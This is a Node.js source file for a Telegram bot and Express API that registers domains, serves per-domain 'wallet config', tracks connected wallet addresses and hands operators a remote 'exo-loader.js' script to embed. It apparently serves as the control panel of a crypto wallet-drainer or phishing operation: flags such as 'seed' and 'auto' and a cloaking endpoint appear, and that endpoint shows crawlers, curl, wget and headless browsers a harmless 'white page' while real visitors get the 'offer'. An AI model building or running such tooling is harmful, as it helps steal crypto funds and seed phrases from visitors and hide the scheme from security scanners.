// exoincs-bot – Telegram bot + REST API for per-domain wallet config
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const { Telegraf } = require('telegraf');

// ------------------------- CONFIG -------------------------
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID || '';
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN) {
    console.error('❌ BOT_TOKEN environment variable not set.');
    process.exit(1);
}

// ------------------------- DATABASE -------------------------
const db = new sqlite3.Database('./exoincs.db');
db.serialize(() => {
    // Table for storing domain configurations
    db.run(`CREATE TABLE IF NOT EXISTS domains (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT UNIQUE,
        exogator_id TEXT,
        modaltheme INTEGER,
        towsteps INTEGER,
        evm INTEGER,
        seed INTEGER,
        auto INTEGER,
        dark INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Table for tracking visitors (wallet connections)
    db.run(`CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT,
        wallet_address TEXT,
        first_seen DATETIME,
        last_seen DATETIME,
        visits INTEGER DEFAULT 1,
        UNIQUE(domain, wallet_address)
    )`);
});

// ------------------------- EXPRESS API -------------------------
const app = express();
app.use(express.json());

// Endpoint: get config for a domain
app.get('/config', (req, res) => {
    const domain = req.query.domain;
    if (!domain) return res.status(400).json({ error: 'Missing domain' });
    db.get(
        `SELECT exogator_id, modaltheme, towsteps, evm, seed, auto, dark FROM domains WHERE domain = ?`,
        [domain],
        (err, row) => {
            if (err || !row) return res.status(404).json({ error: 'Domain not registered' });
            res.json(row);
        }
    );
});

// Endpoint: track wallet connection
app.post('/track', (req, res) => {
    const { domain, wallet_address, action } = req.body;
    if (!domain || !wallet_address) return res.status(400).json({ error: 'Missing domain or wallet_address' });
    const now = new Date().toISOString();
    db.run(
        `INSERT INTO visitors (domain, wallet_address, first_seen, last_seen)
         VALUES (?, ?, ?, ?)
         ON CONFLICT(domain, wallet_address) DO UPDATE SET
            last_seen = excluded.last_seen,
            visits = visits + 1`,
        [domain, wallet_address, now, now],
        (err) => {
            if (err) console.error(err);
            res.json({ ok: true });
        }
    );
});

// Optional endpoint for cloaking decision (simple bot detection)
app.get('/cloak/decision', (req, res) => {
    const { domain, ip, ua } = req.query;
    const uaLower = (ua || '').toLowerCase();
    const isBot = /bot|crawl|spider|scrape|headless|curl|wget|python/i.test(uaLower);
    if (isBot) {
        // You can customize white page URL per domain later
        return res.json({ page: 'white', url: 'https://example.com/white-page.html' });
    }
    return res.json({ page: 'offer' });
});

// ------------------------- TELEGRAM BOT -------------------------
const bot = new Telegraf(BOT_TOKEN);

// Start command
bot.start((ctx) => {
    ctx.reply(`🤖 *Exoincs Bot* – Manage wallet config per domain

Commands:
/register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>
/list
/stats <domain>
/help

Example:
\`/register example.com EXO123 3 1 1 0 0 0\`

After registration, use this script on your website:
\`<script src="https://assets.cdn.express/exo-loader.js?domain=example.com"></script>\`

The script will automatically fetch your wallet settings.`, { parse_mode: 'Markdown' });
});

// Register a new domain
bot.command('register', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 9) {
        return ctx.reply('Usage: /register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>');
    }
    const [domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark] = args.slice(1);
    if (!domain.includes('.')) return ctx.reply('Invalid domain name');
    const modal = parseInt(modaltheme);
    const tow = parseInt(towsteps);
    const e = parseInt(evm);
    const s = parseInt(seed);
    const a = parseInt(auto);
    const d = parseInt(dark);
    if (isNaN(modal) || modal < 1 || modal > 4) return ctx.reply('modaltheme must be 1,2,3,4');
    if ([tow, e, s, a, d].some(v => v !== 0 && v !== 1)) {
        return ctx.reply('towsteps, evm, seed, auto, dark must be 0 or 1');
    }
    db.run(
        `INSERT INTO domains (domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [domain, exogator_id, modal, tow, e, s, a, d],
        (err) => {
            if (err) return ctx.reply(`❌ Domain \`${domain}\` already registered or database error.`, { parse_mode: 'Markdown' });
            const scriptUrl = `https://assets.cdn.express/exo-loader.js?domain=${encodeURIComponent(domain)}`;
            ctx.reply(`✅ Domain \`${domain}\` registered successfully!

📜 *Script URL*:
\`${scriptUrl}\`

Add this to your website <body>:
\`<script src="${scriptUrl}"></script>\`

Your config: modaltheme=${modal}, towsteps=${tow}, evm=${e}, seed=${s}, auto=${a}, dark=${d}`, { parse_mode: 'Markdown' });
        }
    );
});

// List all registered domains (admin only)
bot.command('list', (ctx) => {
    if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Admin only.');
    db.all(`SELECT domain, exogator_id, created_at FROM domains ORDER BY created_at DESC`, (err, rows) => {
        if (err || !rows.length) return ctx.reply('No domains registered.');
        let msg = '*Registered Domains:*\n';
        rows.forEach(r => {
            msg += `🌐 ${r.domain} – ${r.exogator_id} (${r.created_at})\n`;
        });
        ctx.reply(msg, { parse_mode: 'Markdown' });
    });
});

// Show visitor stats for a domain
bot.command('stats', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /stats <domain>');
    const domain = args[1];
    db.get(`SELECT COUNT(*) as total, SUM(visits) as visits FROM visitors WHERE domain = ?`, [domain], (err, row) => {
        if (err || !row || row.total === 0) return ctx.reply(`No data for domain \`${domain}\``, { parse_mode: 'Markdown' });
        ctx.reply(`📊 *Stats for ${domain}*\nUnique wallets: ${row.total}\nTotal visits: ${row.visits || 0}`, { parse_mode: 'Markdown' });
    });
});

// Help command
bot.command('help', (ctx) => {
    ctx.reply(`Commands:
/register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>
/list – list all domains (admin)
/stats <domain> – show visitor stats
/start – show this menu
/help – this message`);
});

// Launch bot
bot.launch();
console.log('🤖 exoincs-bot started');

// Start API server
app.listen(PORT, () => console.log(`🌐 API server listening on port ${PORT}`));
